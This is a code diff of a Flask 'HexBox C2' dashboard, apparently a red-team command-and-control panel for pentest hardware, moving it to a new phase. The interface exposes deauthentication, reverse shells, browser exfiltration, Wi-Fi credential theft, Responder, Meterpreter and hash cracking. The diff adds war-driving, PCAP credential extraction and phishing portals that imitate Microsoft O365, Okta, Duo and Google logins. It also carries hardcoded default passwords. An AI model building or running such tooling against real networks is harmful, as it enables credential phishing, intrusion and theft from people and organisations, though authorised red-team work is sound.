@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# ~/hexbox/c2/hexbox_c2.py — HexBox C2 Dashboard (Phase 4)
+# ~/hexbox/c2/hexbox_c2.py — HexBox C2 Dashboard (Phase 5)
 
 from flask import (Flask, render_template_string, request, jsonify,
                    send_file, session, redirect, Response)
@@ -11,6 +11,8 @@ from pathlib import Path
 
 app = Flask(__name__)
 app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024  # 50 MB
+app.config["SESSION_COOKIE_SAMESITE"] = "Strict"
+app.config["SESSION_COOKIE_HTTPONLY"] = True
 
 # ---------------------------------------------------------------------------
 # Config
@@ -36,7 +38,9 @@ _BUNNY_CFG   = _CFG.get("bashbunny") or DEVICES.get("bashbunny",
 _FLIPPER_CFG = _CFG.get("flipper", {"serial_port": "/dev/ttyACM0"})
 _BH_CFG      = _CFG.get("bloodhound", {"url": "http://localhost:8080",
                                         "username": "admin", "password": "BloodHound!"})
-_SLIVER_CFG  = _CFG.get("sliver", {"host": "127.0.0.1", "port": 31337})
+_SLIVER_CFG  = _CFG.get("sliver",  {"host": "127.0.0.1", "port": 31337})
+_KISMET_CFG  = _CFG.get("kismet",  {"url": "http://localhost:2501",
+                                     "username": "kismet", "password": "kismet"})
 
 LOOT     = Path(os.path.expanduser(_HB.get("loot_dir",  "~/hexbox/loot")))
 LOGS     = Path(os.path.expanduser(_HB.get("log_dir",   "~/hexbox/logs")))
@@ -48,7 +52,8 @@ IFACE_RESPONDER = _IF.get("responder", "eth0")
 IFACE_BETTERCAP = _IF.get("bettercap", "wlan0")
 
 for d in (LOOT, LOGS, LOOT / "nmap", LOOT / "creds", LOOT / "reports",
-          LOOT / "bloodhound", LOOT / "implants", LOOT / "bunny"):
+          LOOT / "bloodhound", LOOT / "implants", LOOT / "bunny",
+          LOOT / "pcaps", LOOT / "portals", LOOT / "wardrive"):
     d.mkdir(parents=True, exist_ok=True)
 
 # ---------------------------------------------------------------------------
@@ -57,17 +62,19 @@ for d in (LOOT, LOGS, LOOT / "nmap", LOOT / "creds", LOOT / "reports",
 
 _TOKEN = os.environ.get("HEXBOX_TOKEN") or _HB.get("api_token") or secrets.token_hex(16)
 app.secret_key = secrets.token_hex(32)
-_VALID_PROCS = {"scan", "responder", "bettercap", "crack", "hashcat", "sliver"}
+_VALID_PROCS = {"scan", "responder", "bettercap", "crack", "hashcat", "sliver", "kismet"}
 
 
 @app.before_request
 def _require_auth():
-    if request.endpoint in ("login", "logout", "events_stream"):
+    if request.endpoint in ("login", "logout"):
         return None
     if session.get("authed") or request.headers.get("X-HexBox-Token") == _TOKEN:
         return None
     if request.is_json or request.headers.get("X-HexBox-Token") is not None:
         return jsonify(error="Unauthorized"), 403
+    if request.headers.get("Accept", "").startswith("text/event-stream"):
+        return "", 403
     return redirect("/login")
 
 # ---------------------------------------------------------------------------
@@ -207,9 +214,10 @@ def sftp_pull(device: str, remote_dir: str, local_dir: Path) -> str:
 
 def _log(msg: str):
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    safe = str(msg).replace("\n", "\\n").replace("\r", "\\r")
     try:
         with open(LOGS / "c2.log", "a") as f:
-            f.write(f"[{ts}] {msg}\n")
+            f.write(f"[{ts}] {safe}\n")
     except Exception:
         pass
 
@@ -249,94 +257,191 @@ DASH = r"""<!DOCTYPE html>
 <html><head><title>HexBox C2</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-*{box-sizing:border-box}
-body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:14px;margin:0;font-size:14px}
-a{color:#0f0}
-h1{margin:0 0 2px;font-size:1.3em;display:flex;align-items:center;gap:10px}
-.eng-badge{background:#111;border:1px solid #333;padding:2px 8px;font-size:.72em;
-           color:#ff0;cursor:pointer;flex-shrink:0}
-.ts-bar{color:#444;font-size:.75em;margin-bottom:8px;display:flex;gap:12px;align-items:center}
-button{background:#111;color:#0f0;border:1px solid #0f0;padding:5px 9px;margin:2px;
-       cursor:pointer;font-family:monospace;font-size:.8em;transition:background .12s}
-button:hover{background:#0f0;color:#000}
-button.kill{border-color:#c00;color:#c00}button.kill:hover{background:#c00;color:#fff}
-button.warn{border-color:#ff0;color:#ff0}button.warn:hover{background:#ff0;color:#000}
-button.dim{border-color:#333;color:#555}button.dim:hover{background:#333;color:#ccc}
-pre{background:#000;border:1px solid #0f0;padding:8px;max-height:300px;overflow:auto;
-    font-size:.75em;white-space:pre-wrap;word-break:break-all;margin:4px 0}
-.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:8px}
-.card{border:1px solid #1a1a1a;padding:9px}
-.card h2{color:#c00;margin:0 0 6px;font-size:.85em;display:flex;
-         justify-content:space-between;align-items:center}
-.dot{width:8px;height:8px;border-radius:50%;display:inline-block;
-     background:#333;flex-shrink:0;cursor:help}
-.dot.up{background:#0f0}.dot.dn{background:#c00}.dot.chk{background:#ff0;animation:pulse 1s infinite}
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg0:#07070b;--bg1:#0c0c12;--bg2:#111118;--bg3:#16161e;--bg4:#1d1d28;
+  --bdr:#1e1e2c;--bdr2:#2a2a3a;--bdr3:#383850;
+  --green:#00ff41;--g2:#00c830;--g3:#008520;--glow-g:rgba(0,255,65,.15);
+  --red:#ff4545;--r2:#cc2020;--glow-r:rgba(255,69,69,.14);
+  --yellow:#ffd700;--y2:#b08800;--glow-y:rgba(255,215,0,.12);
+  --blue:#00b4ff;--b2:#005f99;--cyan:#00e5ff;
+  --t0:#d0d0e0;--t1:#7878a0;--t2:#454560;--t3:#252535;
+  --font:'JetBrains Mono',ui-monospace,'Cascadia Code','Fira Code','Courier New',monospace;
+  --r:2px
+}
+body{background:var(--bg0);color:var(--t0);font-family:var(--font);font-size:13px;line-height:1.5}
+a{color:var(--green)}
+::selection{background:rgba(0,255,65,.18)}
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:var(--bg1)}
+::-webkit-scrollbar-thumb{background:var(--bdr3);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:var(--t2)}
+/* ── Header ── */
+.hdr{background:linear-gradient(90deg,var(--bg2) 0%,var(--bg1) 55%,var(--bg0) 100%);
+     border-bottom:1px solid var(--bdr);padding:0 16px;height:46px;
+     display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:200}
+.hdr-brand{font-size:1.02em;font-weight:700;letter-spacing:.14em;color:var(--green);
+           text-shadow:0 0 24px var(--glow-g);white-space:nowrap;display:flex;align-items:center;gap:7px}
+.hdr-brand-sub{font-weight:400;letter-spacing:.06em;color:var(--t2)}
+.hdr-sep{width:1px;height:18px;background:var(--bdr);flex-shrink:0}
+.eng-badge{background:var(--bg3);border:1px solid var(--bdr2);padding:3px 10px;font-size:.72em;
+           color:var(--yellow);cursor:pointer;border-radius:var(--r);
+           transition:border-color .15s,box-shadow .15s}
+.eng-badge:hover{border-color:var(--y2);box-shadow:0 0 10px var(--glow-y)}
+.hdr-right{margin-left:auto;display:flex;align-items:center;gap:14px}
+.ts-bar{color:var(--t2);font-size:.7em;display:flex;gap:14px;align-items:center;white-space:nowrap}
+/* ── Main layout ── */
+.main{padding:12px 16px}
+/* ── Tabs ── */
+.tab-bar{display:flex;gap:0;margin:0 0 14px;border-bottom:1px solid var(--bdr);flex-wrap:wrap}
+.tab{background:transparent;color:var(--t2);border:none;border-bottom:2px solid transparent;
+     padding:7px 16px;cursor:pointer;font-family:var(--font);font-size:.79em;letter-spacing:.05em;
+     transition:color .12s,border-color .12s;margin-bottom:-1px;user-select:none}
+.tab:hover{color:var(--t0)}
+.tab.active{color:var(--green);border-bottom-color:var(--green)}
+/* ── Buttons ── */
+button{background:var(--bg3);color:var(--t1);border:1px solid var(--bdr);padding:5px 10px;
+       margin:2px;cursor:pointer;font-family:var(--font);font-size:.77em;letter-spacing:.02em;
+       border-radius:var(--r);transition:all .12s;white-space:nowrap;user-select:none}
+button:hover{background:var(--bg4);color:var(--t0);border-color:var(--bdr2)}
+button:active{transform:scale(.97)}
+button:disabled{opacity:.4;cursor:default;pointer-events:none}
+button.primary{border-color:var(--g3);color:var(--green)}
+button.primary:hover{background:rgba(0,255,65,.07);border-color:var(--g2);box-shadow:0 0 8px var(--glow-g)}
+button.kill{border-color:var(--r2);color:var(--red)}
+button.kill:hover{background:rgba(255,69,69,.09);border-color:var(--red);box-shadow:0 0 6px var(--glow-r)}
+button.warn{border-color:var(--y2);color:var(--yellow)}
+button.warn:hover{background:rgba(255,215,0,.08);border-color:var(--yellow)}
+button.dim{border-color:var(--bdr);color:var(--t2)}
+button.dim:hover{border-color:var(--bdr2);color:var(--t1);background:var(--bg4)}
+/* ── Inputs ── */
+input,select,textarea{background:var(--bg1);color:var(--t0);border:1px solid var(--bdr2);
+     padding:4px 7px;font-family:var(--font);font-size:.77em;border-radius:var(--r);
+     outline:none;transition:border-color .12s,box-shadow .12s}
+input:focus,select:focus,textarea:focus{border-color:var(--green);box-shadow:0 0 0 2px rgba(0,255,65,.07)}
+input::placeholder{color:var(--t3)}
+select option{background:var(--bg2)}
+/* ── Cards ── */
+.card{background:var(--bg1);border:1px solid var(--bdr);border-radius:var(--r);
+      overflow:hidden;transition:border-color .2s,box-shadow .2s}
+.card:hover{border-color:var(--bdr2);box-shadow:0 4px 18px rgba(0,0,0,.35)}
+.card-hdr{background:var(--bg2);border-bottom:1px solid var(--bdr);padding:7px 11px;
+          display:flex;align-items:center;justify-content:space-between;gap:8px}
+.card-hdr h2{margin:0;font-size:.8em;font-weight:600;letter-spacing:.06em;color:var(--t0)}
+.card-body{padding:10px 11px;display:flex;flex-wrap:wrap;gap:0}
+/* ── Grid ── */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:8px;margin-bottom:10px}
+/* ── Status dots ── */
+.dot{width:9px;height:9px;border-radius:50%;display:inline-block;background:var(--t3);
+     flex-shrink:0;cursor:help;transition:background .3s,box-shadow .3s}
+.dot.up{background:var(--g2);box-shadow:0 0 8px var(--glow-g)}
+.dot.dn{background:var(--red);box-shadow:0 0 6px var(--glow-r)}
+.dot.chk{background:var(--yellow);animation:pulse 1s infinite}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
-.row{border:1px solid #111;padding:7px;margin-bottom:6px;display:flex;
-     align-items:center;gap:7px;flex-wrap:wrap}
-.row label{color:#555;font-size:.78em;white-space:nowrap}
-input,select,textarea{background:#111;color:#0f0;border:1px solid #333;padding:4px 6px;
-           font-family:monospace;font-size:.8em}
-input:focus,select:focus,textarea:focus{outline:none;border-color:#0f0}
-.bar{border:1px solid #111;padding:7px;margin-bottom:6px}
-.bar h3{margin:0 0 5px;color:#ff0;font-size:.82em}
-.sec{color:#c00;margin:8px 0 3px;font-size:.85em;font-weight:bold}
-.tab-bar{display:flex;gap:3px;margin:8px 0 10px;border-bottom:1px solid #1a1a1a;padding-bottom:5px;flex-wrap:wrap}
-.tab{background:#111;color:#555;border:1px solid #222;padding:5px 14px;
-     cursor:pointer;font-family:monospace;font-size:.82em;transition:color .1s,border-color .1s}
-.tab.active{color:#0f0;border-color:#0f0;background:#0a0a0a}
-.tab:hover{color:#0f0}
-/* Table styles */
-table{width:100%;border-collapse:collapse;font-size:.78em;margin:4px 0}
-th{background:#111;color:#0f0;text-align:left;padding:5px 8px;white-space:nowrap}
-td{padding:4px 8px;border-bottom:1px solid #0d0d0d;vertical-align:top}
-tr:hover td{background:#0d0d0d}
-.hash-cell{font-size:.7em;color:#666;word-break:break-all;max-width:300px}
+/* ── Control rows ── */
+.row{background:var(--bg1);border:1px solid var(--bdr);padding:7px 10px;margin-bottom:8px;
+     display:flex;align-items:center;gap:6px;flex-wrap:wrap;border-radius:var(--r)}
+.row label{color:var(--t1);font-size:.76em;white-space:nowrap}
+/* ── Pre / output ── */
+pre{background:var(--bg0);border:1px solid var(--bdr);border-left:3px solid var(--g3);
+    padding:10px 12px;max-height:280px;overflow:auto;font-size:.72em;white-space:pre-wrap;
+    word-break:break-all;margin:6px 0;color:#88e888;line-height:1.55;
+    border-radius:0 var(--r) var(--r) 0}
+/* ── Bar panels ── */
+.bar{background:var(--bg1);border:1px solid var(--bdr);padding:11px;margin-bottom:8px;
+     border-radius:var(--r)}
+.bar h3{margin:0 0 9px;font-size:.76em;font-weight:600;letter-spacing:.1em;
+        color:var(--yellow);text-transform:uppercase;display:flex;align-items:center;gap:7px}
+/* ── Section headers ── */
+.sec{color:var(--t1);font-size:.73em;font-weight:700;letter-spacing:.1em;text-transform:uppercase;
+     padding:10px 0 5px;border-bottom:1px solid var(--bdr);margin-bottom:7px;
+     display:flex;align-items:center;gap:7px}
+.sec::before{content:'';width:3px;height:11px;background:var(--green);display:inline-block;
+             flex-shrink:0;box-shadow:0 0 6px var(--glow-g)}
+/* ── Tables ── */
+table{width:100%;border-collapse:collapse;font-size:.76em;margin:4px 0}
+th{background:var(--bg2);color:var(--t1);text-align:left;padding:5px 9px;font-size:.72em;
+   letter-spacing:.07em;text-transform:uppercase;border-bottom:1px solid var(--bdr2);white-space:nowrap}
+td{padding:5px 9px;border-bottom:1px solid var(--bdr);vertical-align:top;color:var(--t0)}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:var(--bg2)}
+.hash-cell{font-size:.7em;color:var(--t1);word-break:break-all;max-width:280px}
 .copy-btn{font-size:.65em;padding:1px 5px;margin-left:4px}
-.badge{background:#1a1a1a;border:1px solid #333;padding:1px 5px;font-size:.72em;color:#c00}
-.badge.dc{color:#ff0;border-color:#ff0}
-.badge.win{color:#0af}
-/* Loot file list */
-.loot-row{padding:4px 7px;border-bottom:1px solid #0a0a0a;display:flex;
-          justify-content:space-between;align-items:center;font-size:.76em}
-.loot-row:hover{background:#0d0d0d}
-.loot-meta{color:#333;white-space:nowrap;margin-left:10px}
-/* Activity feed */
-#feed{font-size:.72em;color:#555;max-height:100px;overflow:auto;line-height:1.5}
-.feed-line{padding:1px 0}
-.feed-line.new-loot{color:#0a0}
-.feed-line.proc-start{color:#0af}
-.feed-line.hash-new{color:#ff0}
-/* Toast */
-#toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:6px}
-.toast{background:#111;border:1px solid #0f0;padding:8px 14px;font-size:.78em;
-       opacity:0;transition:opacity .3s;pointer-events:none;max-width:320px}
-.toast.show{opacity:1}
-.toast.warn{border-color:#ff0;color:#ff0}
-.toast.err{border-color:#c00;color:#c00}
-/* Payload builder */
-#payload-preview{max-height:260px;font-size:.72em}
-.pl-list-item{padding:4px 8px;border-bottom:1px solid #0d0d0d;display:flex;
-              justify-content:space-between;align-items:center;font-size:.78em}
-/* Report */
-#report-stats{display:flex;gap:12px;margin:12px 0;flex-wrap:wrap}
-.rstat{border:1px solid #1a1a1a;padding:10px 18px;text-align:center}
-.rstat .rnum{font-size:1.8em;color:#0f0;display:block}
-.rstat .rlbl{color:#444;font-size:.72em}
+/* ── Badges ── */
+.badge{background:var(--bg3);border:1px solid var(--bdr2);padding:1px 6px;font-size:.7em;
+       color:var(--red);border-radius:var(--r);font-weight:600;letter-spacing:.04em}
+.badge.dc{color:var(--yellow);border-color:var(--y2)}
+.badge.win{color:var(--blue);border-color:var(--b2)}
+.enc-badge{font-size:.7em;padding:1px 6px;border-radius:var(--r);
+           border:1px solid var(--bdr);color:var(--t1)}
+.enc-badge.open{color:var(--green);border-color:var(--g3)}
+/* ── Loot list ── */
+.loot-row{padding:5px 9px;border-bottom:1px solid var(--bdr);display:flex;
+          justify-content:space-between;align-items:center;font-size:.76em;transition:background .1s}
+.loot-row:hover{background:var(--bg2)}
+.loot-row a{color:var(--green);cursor:pointer;text-decoration:none}
+.loot-row a:hover{text-decoration:underline}
+.loot-meta{color:var(--t2);white-space:nowrap;margin-left:10px;font-size:.9em}
+/* ── Activity feed ── */
+#feed{font-size:.71em;color:var(--t1);max-height:130px;overflow:auto;line-height:1.65}
+.feed-line{padding:1px 0 1px 8px;border-left:2px solid transparent}
+.feed-line.new-loot{color:#00cc44;border-left-color:var(--g2)}
+.feed-line.proc-start{color:var(--blue);border-left-color:var(--blue)}
+.feed-line.hash-new{color:var(--yellow);border-left-color:var(--yellow)}
+/* ── Toasts ── */
+#toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;
+                 display:flex;flex-direction:column-reverse;gap:6px}
+.toast{background:var(--bg2);border:1px solid var(--bdr2);border-left:3px solid var(--green);
+       padding:9px 14px;font-size:.78em;opacity:0;max-width:340px;
+       transition:opacity .25s,transform .25s;pointer-events:none;
+       transform:translateX(24px);border-radius:0 var(--r) var(--r) 0}
+.toast.show{opacity:1;transform:translateX(0)}
+.toast.warn{border-left-color:var(--yellow);color:var(--yellow)}
+.toast.err{border-left-color:var(--red);color:var(--red)}
+/* ── Payload builder ── */
+#payload-preview{max-height:240px;font-size:.72em;border-left-color:var(--b2)}
+.pl-list-item{padding:5px 9px;border-bottom:1px solid var(--bdr);display:flex;
+              justify-content:space-between;align-items:center;font-size:.76em}
+.pl-list-item:hover{background:var(--bg2)}
+/* ── Report stats ── */
+#report-stats{display:flex;gap:10px;margin:12px 0;flex-wrap:wrap}
+.rstat{background:var(--bg2);border:1px solid var(--bdr2);border-top:2px solid var(--green);
+       padding:10px 20px;text-align:center;min-width:110px;border-radius:0 0 var(--r) var(--r)}
+.rstat .rnum{font-size:1.8em;color:var(--green);display:block;font-weight:700;
+             text-shadow:0 0 16px var(--glow-g);line-height:1.2}
+.rstat .rlbl{color:var(--t2);font-size:.7em;letter-spacing:.06em;text-transform:uppercase}
+/* ── Modal ── */
+.modal-bg{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.78);
+          z-index:1000;display:flex;align-items:center;justify-content:center}
+.modal-box{background:var(--bg2);border:1px solid var(--bdr3);padding:24px;
+           min-width:390px;max-width:500px;border-radius:var(--r);
+           box-shadow:0 20px 60px rgba(0,0,0,.65)}
+/* ── Procs ── */
+#procs{display:flex;flex-wrap:wrap;gap:4px;min-height:22px}
+.proc-chip{display:inline-flex;align-items:center;gap:5px;background:var(--bg3);
+           border:1px solid var(--bdr2);padding:3px 8px;font-size:.74em;border-radius:var(--r)}
+.proc-pid{color:var(--green);font-weight:600}
+.proc-name{color:var(--t0)}
 </style></head><body>
 
 <div id="toast-container"></div>
 
-<h1>&#x1F5A5; HexBox C2
+<header class="hdr">
+  <div class="hdr-brand">&#x2B22; HEXBOX <span class="hdr-brand-sub">C2</span></div>
+  <div class="hdr-sep"></div>
   <span class="eng-badge" id="eng-name" onclick="showEngagementModal()" title="Click to manage engagement">&#x25CF; Loading...</span>
-  <form method="POST" action="/logout" style="margin-left:auto;display:inline">
-    <button class="dim" style="font-size:.72em;padding:3px 8px">Logout</button>
-  </form>
-</h1>
-<div class="ts-bar">
-  <span id="ts">—</span>
-  <span id="proc-summary" style="color:#555">—</span>
-</div>
+  <div class="hdr-right">
+    <div class="ts-bar">
+      <span id="ts">—</span>
+      <span id="proc-summary">—</span>
+    </div>
+    <form method="POST" action="/logout" style="margin:0">
+      <button class="dim" style="font-size:.72em;padding:3px 8px">Logout</button>
+    </form>
+  </div>
+</header>
+
+<div class="main">
 
 <div class="tab-bar">
   <button class="tab active" id="btn-devices"  onclick="showTab('devices')">&#9881; Devices</button>
@@ -345,6 +450,7 @@ tr:hover td{background:#0d0d0d}
   <button class="tab"        id="btn-loot"     onclick="showTab('loot')">&#128193; Loot</button>
   <button class="tab"        id="btn-logs"     onclick="showTab('logs')">&#128203; Logs</button>
   <button class="tab"        id="btn-report"   onclick="showTab('report')">&#x1F4CB; Report</button>
+  <button class="tab"        id="btn-wardrive" onclick="showTab('wardrive')">&#x1F4F6; War-Drive</button>
 </div>
 
 <!-- ========================= DEVICES TAB ========================= -->
@@ -358,66 +464,115 @@ tr:hover td{background:#0d0d0d}
 </div>
 
 <div class="grid">
-<div class="card"><h2>WiFi Pineapple<span class="dot" id="dot-pineapple" title="unknown"></span></h2>
-  <button onclick="run('/pineapple/recon')">Recon</button>
-  <button onclick="run('/pineapple/deauth')" class="kill">Deauth</button>
-  <button onclick="run('/pineapple/evil_portal')">Evil Portal</button>
-  <button onclick="run('/pineapple/monitor_mode')">Monitor Mode</button>
-  <button onclick="run('/pineapple/pmkid')">PMKID</button>
-  <button onclick="run('/pineapple/handshakes')">Pull Handshakes</button>
+
+<div class="card">
+  <div class="card-hdr">
+    <h2>&#x1F34D; WiFi Pineapple</h2>
+    <span class="dot" id="dot-pineapple" title="unknown"></span>
+  </div>
+  <div class="card-body">
+    <button onclick="run('/pineapple/recon')">Recon</button>
+    <button onclick="run('/pineapple/deauth')" class="kill">Deauth</button>
+    <button onclick="run('/pineapple/evil_portal')">Evil Portal</button>
+    <button onclick="run('/pineapple/monitor_mode')">Monitor</button>
+    <button onclick="run('/pineapple/pmkid')">PMKID</button>
+    <button onclick="run('/pineapple/handshakes')">Pull HSK</button>
+  </div>
 </div>
 
-<div class="card"><h2>Shark Jack<span class="dot" id="dot-sharkjack" title="unknown"></span></h2>
-  <button onclick="run('/shark/nmap')">Nmap Sweep</button>
-  <button onclick="run('/shark/arp')">ARP Scan</button>
-  <button onclick="run('/shark/loot')">Pull Loot</button>
+<div class="card">
+  <div class="card-hdr">
+    <h2>&#x1F988; Shark Jack</h2>
+    <span class="dot" id="dot-sharkjack" title="unknown"></span>
+  </div>
+  <div class="card-body">
+    <button onclick="run('/shark/nmap')">Nmap Sweep</button>
+    <button onclick="run('/shark/arp')">ARP Scan</button>
+    <button onclick="run('/shark/loot')">Pull Loot</button>
+  </div>
 </div>
 
-<div class="card"><h2>Packet Squirrel<span class="dot" id="dot-packetsquirrel" title="unknown"></span></h2>
-  <button onclick="run('/squirrel/pcap')">Start PCAP</button>
-  <button onclick="run('/squirrel/dnsspoof')">DNS Spoof</button>
-  <button onclick="run('/squirrel/arpscan')">ARP Scan</button>
-  <button onclick="run('/squirrel/pull')">Pull PCAPs</button>
+<div class="card">
+  <div class="card-hdr">
+    <h2>&#x1F43F;&#xFE0F; Packet Squirrel</h2>
+    <span class="dot" id="dot-packetsquirrel" title="unknown"></span>
+  </div>
+  <div class="card-body">
+    <button onclick="run('/squirrel/pcap')">Start PCAP</button>
+    <button onclick="run('/squirrel/dnsspoof')">DNS Spoof</button>
+    <button onclick="run('/squirrel/arpscan')">ARP Scan</button>
+    <button onclick="run('/squirrel/pull')">Pull PCAPs</button>
+  </div>
 </div>
 
-<div class="card"><h2>LAN Turtle<span class="dot" id="dot-lanturtle" title="unknown"></span></h2>
-  <button onclick="run('/turtle/autossh')">AutoSSH</button>
-  <button onclick="run('/turtle/responder')">Responder</button>
-  <button onclick="run('/turtle/meterpreter')">Meterpreter</button>
-  <button onclick="run('/turtle/sshpivot')">SSH Pivot</button>
+<div class="card">
+  <div class="card-hdr">
+    <h2>&#x1F422; LAN Turtle</h2>
+    <span class="dot" id="dot-lanturtle" title="unknown"></span>
+  </div>
+  <div class="card-body">
+    <button onclick="run('/turtle/autossh')">AutoSSH</button>
+    <button onclick="run('/turtle/responder')">Responder</button>
+    <button onclick="run('/turtle/meterpreter')">Meterpreter</button>
+    <button onclick="run('/turtle/sshpivot')">SSH Pivot</button>
+  </div>
 </div>
 
-<div class="card"><h2>OMG Plug<span class="dot" id="dot-omgplug" title="unknown"></span></h2>
-  <button onclick="run('/omg/payload/reverse')">Reverse Shell</button>
-  <button onclick="run('/omg/payload/exfil')">Exfil Browser</button>
-  <button onclick="run('/omg/payload/wifi')">Steal WiFi</button>
-  <button onclick="run('/omg/payload/sysinfo')">SysInfo</button>
-  <button onclick="run('/omg/payload/ad_recon')">AD Recon</button>
+<div class="card">
+  <div class="card-hdr">
+    <h2>&#x1F50C; OMG Plug</h2>
+    <span class="dot" id="dot-omgplug" title="unknown"></span>
+  </div>
+  <div class="card-body">
+    <button onclick="run('/omg/payload/reverse')">Reverse Shell</button>
+    <button onclick="run('/omg/payload/exfil')">Exfil Browser</button>
+    <button onclick="run('/omg/payload/wifi')">Steal WiFi</button>
+    <button onclick="run('/omg/payload/sysinfo')">SysInfo</button>
+    <button onclick="run('/omg/payload/ad_recon')">AD Recon</button>
+  </div>
 </div>
 
-<div class="card"><h2>Bash Bunny<span class="dot" id="dot-bashbunny" title="unknown"></span></h2>
-  <button onclick="run('/bunny/recon')">Net Recon</button>
-  <button onclick="run('/bunny/loot')">Pull Loot</button><br>
-  <button onclick="installBunnyPayload(1)" class="warn">&#x2B07; Install Switch1</button>
-  <button onclick="installBunnyPayload(2)" class="warn">&#x2B07; Install Switch2</button>
+<div class="card">
+  <div class="card-hdr">
+    <h2>&#x1F430; Bash Bunny</h2>
+    <span class="dot" id="dot-bashbunny" title="unknown"></span>
+  </div>
+  <div class="card-body">
+    <button onclick="run('/bunny/recon')">Net Recon</button>
+    <button onclick="run('/bunny/loot')">Pull Loot</button>
+    <button onclick="installBunnyPayload(1)" class="warn">&#x2B07; Switch1</button>
+    <button onclick="installBunnyPayload(2)" class="warn">&#x2B07; Switch2</button>
+  </div>
 </div>
 
-<div class="card"><h2>Flipper Zero<span class="dot" id="dot-flipper" title="unknown"></span></h2>
-  <button onclick="flipperCmd('nfc')">NFC Detect</button>
-  <button onclick="flipperCmd('rfid')">RFID Read</button>
-  <button onclick="flipperCmd('subghz')">Sub-GHz RX</button>
-  <button onclick="flipperCmd('badusb')" class="warn">BadUSB Run</button>
+<div class="card">
+  <div class="card-hdr">
+    <h2>&#x1F42C; Flipper Zero</h2>
+    <span class="dot" id="dot-flipper" title="unknown"></span>
+  </div>
+  <div class="card-body">
+    <button onclick="flipperCmd('nfc')">NFC Detect</button>
+    <button onclick="flipperCmd('rfid')">RFID Read</button>
+    <button onclick="flipperCmd('subghz')">Sub-GHz RX</button>
+    <button onclick="flipperCmd('badusb')" class="warn">BadUSB Run</button>
+  </div>
 </div>
 
-<div class="card"><h2>Pi Local</h2>
-  <button onclick="run('/pi/responder')">Start Responder</button>
-  <button onclick="stopProc('responder')" class="kill">Stop</button><br>
-  <button onclick="run('/pi/bettercap')">Bettercap MITM</button>
-  <button onclick="stopProc('bettercap')" class="kill">Stop</button><br>
-  <button onclick="run('/pi/handshake_crack')">Crack Handshakes</button>
-  <button onclick="run('/pi/hashcat')" class="warn">Hashcat NTLM</button>
-  <button onclick="stopProc('crack')" class="kill">Stop</button>
+<div class="card">
+  <div class="card-hdr">
+    <h2>&#x1F5A5;&#xFE0F; Pi Local</h2>
+  </div>
+  <div class="card-body">
+    <button onclick="run('/pi/responder')">Responder</button>
+    <button onclick="stopProc('responder')" class="kill">&#x25A0;</button>
+    <button onclick="run('/pi/bettercap')">Bettercap MITM</button>
+    <button onclick="stopProc('bettercap')" class="kill">&#x25A0;</button>
+    <button onclick="run('/pi/handshake_crack')">Crack HSK</button>
+    <button onclick="run('/pi/hashcat')" class="warn">Hashcat</button>
+    <button onclick="stopProc('crack')" class="kill">&#x25A0;</button>
+  </div>
 </div>
+
 </div><!-- /grid -->
 
 <div class="bar"><h3>Background Processes</h3><div id="procs">—</div></div>
@@ -499,6 +654,25 @@ tr:hover td{background:#0d0d0d}
   <span id="bh-status" style="color:#555;font-size:.78em;margin-left:8px"></span>
 </div>
 <div id="intel-bloodhound"><span style="color:#333">Click Refresh to load BloodHound data...</span></div>
+
+<div class="sec">&#x1F4E6; PCAP Analysis</div>
+<div class="row" style="border:none;padding:4px 0;flex-wrap:wrap">
+  <label>File:</label>
+  <select id="pcap-sel" style="flex:1;min-width:180px"><option value="">— select PCAP —</option></select>
+  <button onclick="loadPcapList()" class="dim">&#x21BA; Refresh</button>
+  <button onclick="analyzePcap()" class="warn">&#x1F50D; Analyze</button>
+  <span id="pcap-status" style="color:#555;font-size:.78em;margin-left:8px"></span>
+</div>
+<div id="pcap-protocols" style="margin-bottom:6px"></div>
+<div id="pcap-creds"><span style="color:#333">Select a PCAP and click Analyze...</span></div>
+<div id="pcap-dns" style="margin-top:6px"></div>
+
+<div class="sec">&#x1F3AD; Portal Credentials</div>
+<div class="row" style="border:none;padding:4px 0">
+  <button onclick="refreshPortalCreds()" class="dim">&#x21BA; Refresh</button>
+  <span id="portal-cred-count" style="color:#555;font-size:.78em;margin-left:8px"></span>
+</div>
+<div id="intel-portal-creds"><span style="color:#333">Click Refresh to load portal captures...</span></div>
 </div><!-- /pane-intel -->
 
 <!-- ========================= PAYLOADS TAB ========================= -->
@@ -531,6 +705,31 @@ tr:hover td{background:#0d0d0d}
 
 <div class="sec">Available Payloads</div>
 <div id="payload-list"><span style="color:#333">Loading...</span></div>
+
+<div class="bar" style="margin-top:8px">
+  <h3>&#x1F3AD; Evil Portal</h3>
+  <div class="row" style="border:none;padding:4px 0;flex-wrap:wrap">
+    <label>Template:</label>
+    <select id="portal-type">
+      <option value="o365">Microsoft O365</option>
+      <option value="okta">Okta</option>
+      <option value="duo">Duo Security</option>
+      <option value="google">Google</option>
+    </select>
+    <label>Catcher IP:</label>
+    <input id="portal-ip" value="{{hexbox_ip}}" style="width:120px">
+    <label>Port:</label>
+    <input id="portal-port" value="8000" style="width:60px">
+    <label>Redirect:</label>
+    <input id="portal-redirect" placeholder="(auto)" style="width:180px">
+  </div>
+  <div style="margin-top:4px;display:flex;gap:6px;flex-wrap:wrap">
+    <button onclick="previewPortal()">&#x1F441; Preview</button>
+    <button onclick="downloadPortal()" class="dim">&#x2B07; Download</button>
+    <button onclick="deployPortalToPineapple()" class="warn">&#x26A1; Deploy to Pineapple</button>
+  </div>
+  <div id="portal-msg" style="color:#555;font-size:.78em;margin-top:4px"></div>
+</div>
 </div><!-- /pane-payloads -->
 
 <!-- ========================= LOOT TAB ========================= -->
